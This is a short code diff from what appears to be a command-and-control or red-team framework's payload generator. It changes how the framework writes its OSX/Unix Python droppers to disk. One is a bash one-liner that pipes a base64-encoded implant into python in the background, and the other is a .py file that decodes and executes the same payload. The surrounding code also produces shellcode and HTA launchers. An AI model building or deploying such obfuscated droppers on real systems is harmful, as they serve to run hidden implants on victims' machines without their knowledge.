@@ -418,15 +418,22 @@ ao.run('%s', 0);window.close();
 
   def CreatePython(self, name=""):
     self.QuickstartLog( ""+Colours.END )
-    self.QuickstartLog( "OSX Python Payload:"+Colours.GREEN )
+    self.QuickstartLog( "OSX/Unix Python Payload:"+Colours.GREEN )
     py = base64.b64encode(self.Python)
     #print self.Python
-    pydropper = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % py
+    pydropper_bash = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % py
+    filename = "%s%spy_dropper.sh" % (self.BaseDirectory,name)
+    output_file = open(filename, 'w')
+    output_file.write(pydropper_bash)
+    output_file.close()
+    self.QuickstartLog( pydropper_bash )
+
+    #print self.Python
+    pydropper_python = "import sys,base64;exec(base64.b64decode('%s'));" % py
     filename = "%s%spy_dropper.py" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
-    output_file.write(pydropper)
+    output_file.write(pydropper_python)
     output_file.close()
-    self.QuickstartLog( pydropper )
 
   def CreateEXE(self, name=""):
     with open("%s%sPosh-shellcode_x64.bin" % (self.BaseDirectory,name), 'rb') as f:
